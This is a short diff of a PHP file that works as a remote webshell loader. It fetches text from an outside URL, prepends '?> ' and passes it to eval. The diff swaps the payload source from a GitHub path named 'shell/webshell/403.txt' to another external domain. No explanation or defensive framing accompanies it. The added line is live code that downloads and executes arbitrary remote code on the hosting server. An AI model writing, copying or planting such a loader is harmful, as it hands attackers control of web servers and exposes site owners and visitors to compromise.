@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/shell/refs/heads/main/webshell/403.txt');
+$zhyvenseo = file_get_contents('https://danantaraindonesia.org/tolol.txt');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
